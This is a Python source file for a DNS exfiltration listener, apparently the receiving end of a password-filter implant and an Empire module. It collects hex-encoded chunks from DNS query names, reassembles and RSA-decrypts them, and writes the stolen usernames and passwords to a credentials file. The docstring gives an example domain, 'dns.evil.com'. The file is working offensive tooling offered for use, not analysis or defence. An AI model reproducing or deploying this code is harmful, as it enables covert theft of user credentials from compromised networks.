#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function

import re
from math import ceil
import time

from dnslib import RR,QTYPE,RCODE,TXT,parse_time
from dnslib.label import DNSLabel
from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

SYNTAX = re.compile(r'(\d+)\.([a-fA-F0-9]+)\..*')
MAX_LABEL_SIZE = 62 # Should match define in passwordFilter.c

class ExfilResolver(BaseResolver):
    """
     A DNS resolver that always replies with an empty record, but keeps track of
     encrypted chunks and dumps decrypted blocks.

     The chunks are formatted according to the `SYNTAX` regular expression, that is:
         <index>.<data>.domain.name.tld

    For example, `01.85437de3829bc[...]432f.dns.evil.com`

    The server will compupte the expected number of chunks based on the private
    key length automatically.

    Currently, the server does not support concurrent requests, in the off chance that
    two password changes occur simultaneously. This could be implemented in two ways:

        1. Cluster chunks by time intervals. This can still fail if two resets
           happen in very close succession.
        2. Add an additional label on the domain that contains a block
           identifier. This requires changing the implant code and updating the
           Empire module.

    FIXME: Group by time proximity to avoid interleaving?
    FIXME: Edge case: Simultaneous exfiltrations will lead to interleaved blocks
    """
    def __init__(self,ttl,outfile, key):
        self.ttl = parse_time(ttl)
        self.out = outfile
        self.key = key
        self.chunk_num = ceil(key.size_in_bytes() / (MAX_LABEL_SIZE/2.0))

        # Keep track of requests
        self.chunks = {}

    def decrypt(self, block):
        rsa = PKCS1_OAEP.new(self.key)
        return rsa.decrypt(block).strip().replace('\x00', '')

    def resolve(self,request,handler):
        reply = request.reply()
        qname = request.q.qname
        # Format is 00.DATA.domain.tld'
        qstr = str(qname)
        label = qstr.split('.')

        if SYNTAX.match(qstr):
            chunk_id = int(label[0])
            chunk_data = label[1]
            if chunk_id not in self.chunks: self.chunks[chunk_id] = chunk_data

            # Decrypt and dump the chunk
            if len(self.chunks) == self.chunk_num:
                block = "".join([ self.chunks[i] for i in sorted(self.chunks.keys())]).decode('hex')
                plain = self.decrypt(block)
                try:
                    print('[+] %s: Credentials logged for user %s' % (time.ctime(), plain.split(':')[0]))
                    with open(self.out, 'ab') as o:
                        o.write('[%s] %s\n' % (time.ctime(), plain))
                except:
                    pass
                self.chunks.clear()

        reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("x00x00x00x00x00")))
        return reply

if __name__ == '__main__':
    import argparse,sys,time

    p = argparse.ArgumentParser(description="A simple receive-only DNS server for exfiltration")
    p.add_argument("--ttl","-t",default="60s", metavar="<ttl>", help="Response TTL (default: 60s)")
    p.add_argument("--port","-p",type=int,default=53, metavar="<port>", help="Server port (default:53)")
    p.add_argument("--address","-a",default="", metavar="<address>", help="Listen address (default:all)")
    p.add_argument("--output", "-o",required=False, default="creds.txt", help="Filename to output credentials to (default: creds.txt)")
    p.add_argument("--key", "-k",required=True, default="key.pem", help="Path to the private key for decryption")
    args = p.parse_args()

    print('[+] dns.py Started: %s' % (time.ctime()))
    # Load private key
    print('[+] Loading private key...')
    with open(args.key, 'rb') as k:
        raw = k.read()
        try:
            key = RSA.import_key(raw)
        except:
            # Maybe with a passphrase?
            try:
                import getpass
                p = getpass.getpass()
                key = RSA.import_key(raw, passphrase=p.strip())
            except Exception as e:
                print('[!] Could not read private key: ' + str(e))
                sys.exit(1)

    resolver = ExfilResolver(args.ttl, args.output, key)
    # logger = DNSLogger("request,reply,truncated,error",False)
    logger = DNSLogger("error",False)

    udp_server = DNSServer(resolver, port=args.port, address=args.address, logger=logger)
    udp_server.start_thread()

    print('[+] DNS Server started')
    while udp_server.isAlive(): time.sleep(1)
